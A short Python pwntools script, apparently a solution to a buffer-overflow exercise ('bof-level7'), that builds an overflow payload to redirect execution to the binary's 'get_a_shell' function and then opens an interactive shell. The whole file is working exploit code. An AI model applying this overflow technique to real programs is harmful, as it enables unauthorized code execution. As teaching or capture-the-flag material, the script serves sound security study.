#!/usr/bin/env python

from pwn import *

p = process('./bof-level7')
#Do not care for connecting to gdb for turn in
context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(p)

e = ELF('./bof-level7')

shellAddr = e.symbols['get_a_shell']

print('get_a_shell:')
print(hex(shellAddr))
#buf = "A" * 136 + "\x10"

#Run this first time to crash the program with the correct buffer allowing second run to work properly
#p.sendline(buf)
#p.wait()

#c = Core('./core')

#buffer_addr = c.stack.find(buf)
#print('buffer_addr:')
#print(hex(buffer_addr))

buf = "A" * 0x60 + "BBBB" + p32(shellAddr)
buf = buf + "A" * (136 - len(buf)) + "\x00"

print(buf)
print(p.recv())

p.sendline(buf)

p.interactive()
